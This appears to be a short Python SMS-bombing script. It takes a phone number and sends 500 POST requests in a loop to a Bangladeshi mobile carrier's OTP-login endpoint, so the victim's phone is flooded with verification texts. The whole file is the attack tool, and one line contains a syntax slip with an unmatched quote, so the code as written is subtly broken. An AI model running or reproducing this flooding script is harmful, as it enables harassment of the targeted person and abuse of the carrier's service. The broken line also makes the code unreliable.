import requests

# post
number=str(input("Enter Your number:"))
myblapi="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"
data={"mobile":'+number}

for i in range(500):
	requests.post(myblapi,data=data)
	print(str(i+1)+"sms send")
